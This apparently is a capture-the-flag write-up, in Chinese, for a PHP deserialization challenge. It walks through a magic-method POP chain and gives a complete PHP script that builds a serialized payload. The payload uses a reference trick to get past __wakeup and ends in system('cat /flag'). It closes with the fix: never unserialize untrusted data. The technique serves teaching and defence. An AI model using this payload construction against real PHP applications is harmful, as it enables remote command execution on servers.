# ez_unserialize

## 题目简述

`unserialize($_GET['u'])` 接受完全可控对象。POP 链为 `DataObject::__destruct()` → `Storage::__set()` → `Cache::expired()` → `Helper::__call()`，最终可动态调用 `system`。难点是 `Cache::__wakeup()` 会把 `expired` 重置为 false，需要利用 PHP 引用在反序列化完成后再次改变该属性。

## 解题过程

各环节的作用如下：

1. `DataObject::__destruct()` 遍历 `data`，把每个 Cache 写入 `storage` 的不存在属性，从而触发 `Storage::__set()`；
2. `Storage::__set()` 会先在 `$this->store` 为空时把它改成数组，再调用 `$value->expired()`；
3. 当 Cache 的 `expired` 为真时，`expired()` 调用 `$this->helper->clean($this->key)`；
4. `Helper` 没有 `clean()`，于是进入 `__call()`，并按 `funcs['clean']` 调用 `system($key)`。

构造两个 Cache，并令 `Storage::$store` 引用第二个 Cache 的 `expired`：

```php
<?php
class Cache {
    public $key, $value, $expired, $helper;
}
class Storage {
    public $store;
}
class Helper {
    public $funcs;
}
class DataObject {
    public $storage, $data;
}

$helper = new Helper();
$helper->funcs = ['clean' => 'system'];

$cache1 = new Cache();
$cache1->expired = false;

$cache2 = new Cache();
$cache2->key = 'cat /flag';
$cache2->helper = $helper;
$cache2->expired = false;

$storage = new Storage();
$storage->store =& $cache2->expired;

$object = new DataObject();
$object->storage = $storage;
$object->data = ['first' => $cache1, 'second' => $cache2];

echo urlencode(serialize($object));
?>
```

反序列化时，两个 `__wakeup()` 先把 `expired` 设为 false。析构阶段处理 `cache1` 时，`store` 为空，于是 `Storage::__set()` 把它改为数组；由于 `store` 与 `cache2->expired` 是同一引用，后者同步变成数组。存入 `cache1` 后数组非空，处理 `cache2` 时 `if ($this->expired)` 为真，最终执行 `system('cat /flag')`。

把脚本输出作为 `u` 查询参数提交即可。先将命令改为 `id` 可验证代码执行，再读取部署环境中的 flag 文件。

## 方法总结

分析 PHP 反序列化应从魔术方法入口反向寻找危险调用，并逐步确认对象类型、属性值和触发时序。`__wakeup()` 的赋值不一定能消除恶意状态，因为序列化格式能够保存引用关系；根本修复是停止反序列化不可信数据，或使用纯数据格式并进行严格模式校验。
